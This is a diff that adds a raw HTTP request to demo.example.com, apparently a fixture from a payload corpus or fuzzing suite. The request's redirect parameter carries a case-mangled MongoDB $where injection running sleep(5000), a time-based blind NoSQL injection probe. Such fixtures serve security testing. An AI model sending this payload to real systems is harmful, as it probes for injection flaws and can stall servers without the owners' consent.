@@ -1,0 +1,4 @@
+GET /a?redirect={"$wHeRe":"SlEeP(5000)%20||%20tRuE"} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
